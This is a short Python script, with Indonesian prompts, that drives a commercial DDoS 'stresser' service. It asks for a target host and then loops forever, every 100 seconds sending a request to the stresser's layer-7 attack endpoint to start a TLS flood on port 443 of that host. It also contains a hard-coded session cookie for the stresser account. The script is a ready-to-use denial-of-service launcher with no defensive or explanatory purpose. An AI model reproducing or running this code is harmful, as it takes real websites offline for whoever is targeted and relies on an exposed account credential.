import requests
import time

headers = {
    "Cookie": "_ga=GA1.1.1978511152.1717579125; PHPSESSID=ko5vj914rlkims7q2ipgk92t72; _ga_CQ0717FTC6=GS1.1.1718057479.7.1.1718057718.0.0.0; TawkConnectionTime=0; twk_uuid_60d20e8865b7290ac6375211=%7B%22uuid%22%3A%221.WrwKAQljNSjtrjQ74U2Ksk7xpyYIY4AVEMF90wBaXYF5HrRYuxZbMTUcYf7MGbeibU3PzWTrhthpYxLYgLhcgpccqwrbSTBMDNkedNT4bVMCwr5rn4Xwed2zc%22%2C%22version%22%3A3%2C%22domain%22%3A%22redstresser.org%22%2C%22ts%22%3A1718057732485%7D",
    "Sec-Ch-Ua": '"Chromium";v="125", "Not.A/Brand";v="24"',
    "Sec-Ch-Ua-Mobile": "?0",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Accept": "*/*",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://redstresser.org/hub",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Priority": "u=1, i"
}

def main():
    host = input("Masukkan URL host: ")
    url = f"https://redstresser.org/complexx/layer7.php?type=start&host={host}&port=443&time=100&method=TLS-DETECT&totalservers=1&vip=undefined"

    while True:
        try:
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                print("Sudah Berjalan...")
            else:
                print(f"Error: {response.status_code}")
        except Exception as e:
            print(f"Terjadi kesalahan: {e}")
        time.sleep(100)  # Delay 100 detik sebelum request berikutnya

if __name__ == "__main__":
    main()
